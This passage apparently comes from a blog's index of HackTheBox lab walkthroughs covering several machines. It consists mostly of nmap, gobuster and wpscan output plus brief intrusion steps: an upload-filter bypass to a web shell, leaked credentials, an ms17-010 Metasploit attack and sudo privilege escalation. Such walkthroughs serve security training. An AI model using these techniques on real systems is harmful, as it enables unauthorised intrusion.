gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 17:16:22 Starting gobuster in directory enumeration mode =============================================================== /uploads (Status: 301) [Size: 305] [--\u0026gt; http://bank.htb/uploads/] /assets (Status: 301) [Size: 304] [--\u0026gt; http://bank.htb/assets/] /inc (Status: 301) [Size: 301] [--\u0026gt; http://bank.htb/inc/] /server-status (Status: 403) [Size: 288] /balance-transfer (Status: 301) [Size: 314] [--\u0026gt; http://bank.htb/balance-transfer/] Progress: 220431 / 220561 (99.94%) Web server Let\u0026rsquo;s check inc edpoint from gobuster results Let\u0026rsquo;s launch Burp Suite We see strange response when accessing / path We recieve a big redirect response Foothold/User Let\u0026rsquo;s check balance-transfer endpoint We see bunch of transaction files Let\u0026rsquo;s curl and parse the results We see that majority of files have almost identical sizes except one Let\u0026rsquo;s check it We have credentials Use them to login to web server While checking the server, we notice that there is a support page with upload ticket option Let\u0026rsquo;s try file upload attack Check the request in Burp Suite I was trying manipulating Content-Type, adding magic byte, changing file extensions Then I noticed the comment Change extension to htb We were able to upload the file and now we have web-shell Let\u0026rsquo;s launch reverse-shell Root Basic privilege escalation routine Check sudo rights Check suid files etc. or use linpeas like tools We notice strange file named emergency Launch it Boom, we rooted the box Different approach There is a different approach to gain a foothold We saw that we receive a full page, but with response headers 301 or 302 status codes We can set Burp Suite proxy settings to Match and Replace those codes to 200 OK And we will simply open the page without any redirection ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bank/images/bank.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bank/","summary":"Bank Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -sC -sV 10.10.10.29 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 16:18 BST Nmap scan report for 10.10.10.29 (10.10.10.29) Host is up (0.12s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 08eed030d545e459db4d54a8dc5cef15 (DSA) | 2048 b8e015482d0df0f17333b78164084a91 (RSA) | 256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA) |_ 256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519) 53/tcp open domain ISC BIND 9.","tags":["HTB"],"title":"[HTB] Machine: Bank"},{"categories":null,"contents":"Blocky Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.37 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 18:28 BST Nmap scan report for 10.10.10.37 (10.10.10.37) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA) | 256 5d7f389570c9beac67a01e86e7978403 (ECDSA) |_ 256 09d5c204951a90ef87562597df837067 (ED25519) 80/tcp open http Apache httpd 2.4.18 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Did not follow redirect to http://blocky.htb 8192/tcp closed sophos Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.02 seconds Start gobuster â””â”€$ gobuster dir -u http://blocky.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://blocky.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 18:34:46 Starting gobuster in directory enumeration mode =============================================================== /wiki (Status: 301) [Size: 307] [--\u0026gt; http://blocky.htb/wiki/] /wp-content (Status: 301) [Size: 313] [--\u0026gt; http://blocky.htb/wp-content/] /plugins (Status: 301) [Size: 310] [--\u0026gt; http://blocky.htb/plugins/] /wp-includes (Status: 301) [Size: 314] [--\u0026gt; http://blocky.htb/wp-includes/] /javascript (Status: 301) [Size: 313] [--\u0026gt; http://blocky.htb/javascript/] /wp-admin (Status: 301) [Size: 311] [--\u0026gt; http://blocky.htb/wp-admin/] /phpmyadmin (Status: 301) [Size: 313] [--\u0026gt; http://blocky.htb/phpmyadmin/] /server-status (Status: 403) [Size: 298] Progress: 220560 / 220561 (100.00%) We see wp-admin, so launch wpscan and enumerate Wordpress â””â”€$ wpscan -e --url http://blocky.htb _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]n [+] URL: http://blocky.htb/ [10.10.10.37] [+] Started: Tue Jun 6 18:43:45 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://blocky.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.8 identified (Insecure, released on 2017-06-08). | Found By: Rss Generator (Passive Detection) | - http://blocky.htb/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.8\u0026lt;/generator\u0026gt; | - http://blocky.htb/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.8\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyseventeen | Location: http://blocky.htb/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: \u0026#39;Version: 1.3\u0026#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:22 \u0026lt;============================================================================================================================================================\u0026gt; (494 / 494) 100.00% Time: 00:00:22 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] No themes Found. [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:01:44 \u0026lt;==========================================================================================================================================================\u0026gt; (2575 / 2575) 100.00% Time: 00:01:44 [i] No Timthumbs Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:05 \u0026lt;=============================================================================================================================================================\u0026gt; (137 / 137) 100.00% Time: 00:00:05 [i] No Config Backups Found. [+] Enumerating DB Exports (via Passive and Aggressive Methods) Checking DB Exports - Time: 00:00:02 \u0026lt;===================================================================================================================================================================\u0026gt; (71 / 71) 100.00% Time: 00:00:02 [i] No DB Exports Found. [+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to \u0026#34;Plain\u0026#34; for those to be detected) Brute Forcing Attachment IDs - Time: 00:00:04 \u0026lt;========================================================================================================================================================\u0026gt; (100 / 100) 100.00% Time: 00:00:04 [i] No Medias Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 \u0026lt;==============================================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:01 [i] User(s) Identified: [+] notch | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Notch | Found By: Rss Generator (Passive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Tue Jun 6 18:46:16 2023 [+] Requests Done: 3436 [+] Cached Requests: 10 [+] Data Sent: 922.433 KB [+] Data Received: 1.008 MB [+] Memory used: 285.152 MB [+] Elapsed time: 00:02:30 Check phpmyadmin endpoint Foothold/User Check plugins endpoint We see 2 files Download them They have jar extension Upload them jd-gui We retrieve password Try with a notch user that we enumerated with wpscan Success Root Check sudo rights Full sudo access ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/blocky/images/blocky.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/blocky/","summary":"Blocky Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.37 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 18:28 BST Nmap scan report for 10.10.10.37 (10.10.10.37) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA) | 256 5d7f389570c9beac67a01e86e7978403 (ECDSA) |_ 256 09d5c204951a90ef87562597df837067 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Blocky"},{"categories":null,"contents":"Blue Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 20:32 BST Nmap scan report for 10.10.10.40 (10.10.10.40) Host is up (0.17s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 2023-06-06T19:33:22 |_ start_date: 2023-06-06T19:27:47 | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-06-06T20:33:23+01:00 |_clock-skew: mean: -20m25s, deviation: 34m35s, median: -27s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 95.84 seconds nmap scripts â””â”€$ nmap -Pn -p135,139,445 --script *vuln* 10.10.10.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 20:37 BST Nmap scan report for 10.10.10.40 (10.10.10.40) Host is up (0.22s latency). PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND |_smb-vuln-ms10-054: false | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ Nmap done: 1 IP address (1 host up) scanned in 17.09 seconds Right away we see that the box is vulnerable to ms17-010 Foothold/User/Root Launch metasploit Search for ms17_010 Set options And launch the attack Wait for exploit to finish Grab your flags ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/blue/images/blue.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/blue/","summary":"Blue Enumeration nmap â””â”€$ nmap -sC -sV 10.10.10.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 20:32 BST Nmap scan report for 10.10.10.40 (10.10.10.40) Host is up (0.17s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 2023-06-06T19:33:22 |_ start_date: 2023-06-06T19:27:47 | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.","tags":["HTB"],"title":"[HTB] Machine: Blue"},{"categories":null,"contents":"Jupiter Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -sC -sV 10.10.11.216 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 15:10 BST Nmap scan report for 10.10.11.216 (10.10.11.216) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA) |_ 256 6001d7db927b13f0ba20c6c900a71b41 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://jupiter.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.19 seconds ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/jupiter/images/jupiter.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/jupiter/","summary":"Jupiter Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -sC -sV 10.10.11.216 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 15:10 BST Nmap scan report for 10.10.11.216 (10.10.11.216) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA) |_ 256 6001d7db927b13f0ba20c6c900a71b41 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://jupiter.","tags":["HTB"],"title":"[HTB] Machine: Jupiter"},{"categories":null,"contents":"Mirai Enumeration nmap all ports â””â”€$ nmap -Pn -p- 10.10.10.48 -T5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 21:32 BST Warning: 10.10.10.48 giving up on port because retransmission cap hit (2). Stats: 0:12:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 85.56% done; ETC: 21:46 (0:02:02 remaining) Nmap scan report for 10.10.10.48 (10.10.10.48) Host is up (0.17s latency). Not shown: 64338 closed tcp ports (conn-refused), 1191 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 80/tcp open http 1331/tcp open intersan 32400/tcp open plex 32469/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 800.94 seconds nmap â””â”€$ nmap -Pn -p22,53,80,1331,32400,32469 -sC -sV 10.10.10.48 -T5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 21:46 BST Nmap scan report for 10.10.10.48 (10.10.10.48) Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0) | ssh-hostkey: | 1024 aaef5ce08e86978247ff4ae5401890c5 (DSA) | 2048 e8c19dc543abfe61233bd7e4af9b7418 (RSA) | 256 b6a07838d0c810948b44b2eaa017422b (ECDSA) |_ 256 4d6840f720c4e552807a4438b8a2a752 (ED25519) 53/tcp open domain dnsmasq 2.76 | dns-nsid: |_ bind.version: dnsmasq-2.76 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). 1331/tcp open upnp Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) 32400/tcp open http Plex Media Server httpd |_http-favicon: Plex |_http-title: Unauthorized |_http-cors: HEAD GET POST PUT DELETE OPTIONS | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. 32469/tcp open upnp Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.46 seconds Check web server Nothing to see Launch gobuster Check admin and versions endpoints Check port 32400 Foothold/User We saw in admin endpoint, that it\u0026rsquo;s a Pi-hole It\u0026rsquo;s a DNS sinkhole that is designed to run on Raspberry Pi So let\u0026rsquo;s try default credentials to get an access We\u0026rsquo;re in Root Check sudo rights sudo user Retrieve the flag Oops, we have a note instead It says to check a usb stick Let\u0026rsquo;s check mounted devices We see /dev/sdb mounted at /media/usbstick, where have another note which indicates that the flag was accidentally deleted You can also use mount to see mounted devices I googled to find a way to retrieve a flag Since in linux everything is a file, maybe we can read the contents of the /dev/sdb The files in any OS usually don\u0026rsquo;t get deleted from device, since it\u0026rsquo;s costly to zero every block on the disk When the file gets deleted, the metadata of the blocks (headers etc) that held the data will be changed from used to free The data will be present, until it is overwritten So let\u0026rsquo;s grep the flag ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/mirai/images/mirai.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/mirai/","summary":"Mirai Enumeration nmap all ports â””â”€$ nmap -Pn -p- 10.10.10.48 -T5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 21:32 BST Warning: 10.10.10.48 giving up on port because retransmission cap hit (2). Stats: 0:12:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 85.56% done; ETC: 21:46 (0:02:02 remaining) Nmap scan report for 10.10.10.48 (10.10.10.48) Host is up (0.17s latency). Not shown: 64338 closed tcp ports (conn-refused), 1191 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 80/tcp open http 1331/tcp open intersan 32400/tcp open plex 32469/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 800.","tags":["HTB"],"title":"[HTB] Machine: Mirai"},{"categories":null,"contents":"Beep Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -sC -sV 10.10.10.7 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 14:45 BST Nmap scan report for 10.10.10.7 (10.10.10.7) Host is up (0.14s latency). Not shown: 984 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.3 (protocol 2.0) | ssh-hostkey: | 1024 adee5abb6937fb27afb83072a0f96f53 (DSA) |_ 2048 bcc6735913a18a4b550750f6651d6d0d (RSA) 25/tcp open smtp Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN 80/tcp open http Apache httpd 2.2.3 |_http-title: Did not follow redirect to https://10.10.10.7/ |_http-server-header: Apache/2.2.3 (CentOS) 110/tcp open pop3 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_pop3-capabilities: TOP LOGIN-DELAY(0) EXPIRE(NEVER) RESP-CODES STLS PIPELINING APOP IMPLEMENTATION(Cyrus POP3 server v2) USER AUTH-RESP-CODE UIDL 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 875/udp status |_ 100024 1 878/tcp status 143/tcp open imap Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_imap-capabilities: ID STARTTLS BINARY MULTIAPPEND Completed IDLE OK QUOTA URLAUTHA0001 X-NETSCAPE THREAD=REFERENCES NO LITERAL+ CHILDREN LISTEXT CONDSTORE ATOMIC CATENATE MAILBOX-REFERRALS RENAME SORT=MODSEQ THREAD=ORDEREDSUBJECT IMAP4rev1 LIST-SUBSCRIBED UNSELECT ACL SORT ANNOTATEMORE UIDPLUS NAMESPACE RIGHTS=kxte IMAP4 443/tcp open ssl/http Apache httpd 2.2.3 ((CentOS)) |_http-server-header: Apache/2.2.3 (CentOS) | http-robots.txt: 1 disallowed entry |_/ | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2017-04-07T08:22:08 |_Not valid after: 2018-04-07T08:22:08 |_ssl-date: 2023-06-03T13:48:55+00:00; -28s from scanner time. |_http-title: Elastix - Login page 993/tcp open ssl/imap Cyrus imapd |_imap-capabilities: CAPABILITY 995/tcp open pop3 Cyrus pop3d 2002/tcp filtered globe 3306/tcp open mysql MySQL (unauthorized) 4445/tcp open upnotifyp? 7070/tcp filtered realserver 7625/tcp filtered unknown 9091/tcp filtered xmltec-xmlmail 10000/tcp open http MiniServ 1.570 (Webmin httpd) |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). Service Info: Hosts: beep.localdomain, 127.0.0.1, example.com Host script results: |_clock-skew: -28s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 410.61 seconds Webserver There were too many open ports to check, so I started gobuster in the background Foothold/User Right away I got results, and found admin endpoint Where we can wee the version of the application Found a exploit in exploit-db Same results can be achieved using searchsploit Well, I tried using searchsploit's exploit But no success Since the box is old, I thought maybe there were some version inconsistencies related to libraries, which then happened to be SSL Then I found updated version of exploit Let\u0026rsquo;s run it and get a shell Root The first thing I always check is sudo privileges We see bunch of sudo rights Use GTFOBins and get a root I choose nmap as a privesc path Check 0xdf for other paths ","date":"June 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/beep/images/beep.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/beep/","summary":"Beep Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -sC -sV 10.10.10.7 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 14:45 BST Nmap scan report for 10.10.10.7 (10.10.10.7) Host is up (0.14s latency). Not shown: 984 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.3 (protocol 2.0) | ssh-hostkey: | 1024 adee5abb6937fb27afb83072a0f96f53 (DSA) |_ 2048 bcc6735913a18a4b550750f6651d6d0d (RSA) 25/tcp open smtp Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Beep"},{"categories":null,"contents":"Grandpa Enumeration Nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.14 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:44 BST Nmap scan report for 10.10.10.14 (10.10.10.14) Host is up (0.093s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.0 | WebDAV type: Unknown | Server Date: Sun, 04 Jun 2023 17:44:06 GMT |_ Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | http-methods: |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH | http-ntlm-info: | Target_Name: GRANPA | NetBIOS_Domain_Name: GRANPA | NetBIOS_Computer_Name: GRANPA | DNS_Domain_Name: granpa | DNS_Computer_Name: granpa |_ Product_Version: 5.2.3790 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.37 seconds gobuster â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ gobuster dir -u http://10.10.10.14/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.14/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/05 15:53:38 Starting gobuster in directory enumeration mode =============================================================== /_vti_inf.html (Status: 200) [Size: 1754] /postinfo.html (Status: 200) [Size: 2440] /. (Status: 200) [Size: 1433] /pagerror.gif (Status: 200) [Size: 2806] /iisstart.htm (Status: 200) [Size: 1433] Progress: 16239 / 16245 (99.96%) =============================================================== 2023/06/05 15:56:54 Finished =============================================================== Foothold We see a webserver No results on gobuster Based on nmap, we have Microsoft-IIS/6.0 I ran davtest, yet got no success So started googling for public exploits Launched metasploit And got shell As an alternative you can use the following script suggested by 0xdf Root systeminfo c:\\windows\\system32\\inetsrv\u0026gt;systeminfo systeminfo Host Name: GRANPA OS Name: Microsoft(R) Windows(R) Server 2003, Standard Edition OS Version: 5.2.3790 Service Pack 2 Build 3790 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Uniprocessor Free Registered Owner: HTB Registered Organization: HTB Product ID: 69712-296-0024942-44782 Original Install Date: 4/12/2017, 5:07:40 PM System Up Time: 0 Days, 0 Hours, 50 Minutes, 27 Seconds System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: X86-based PC Processor(s): 1 Processor(s) Installed. [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: INTEL - 6040000 Windows Directory: C:\\WINDOWS System Directory: C:\\WINDOWS\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (GMT+02:00) Athens, Beirut, Istanbul, Minsk Total Physical Memory: 1,023 MB Available Physical Memory: 762 MB Page File: Max Size: 2,470 MB Page File: Available: 2,300 MB Page File: In Use: 170 MB Page 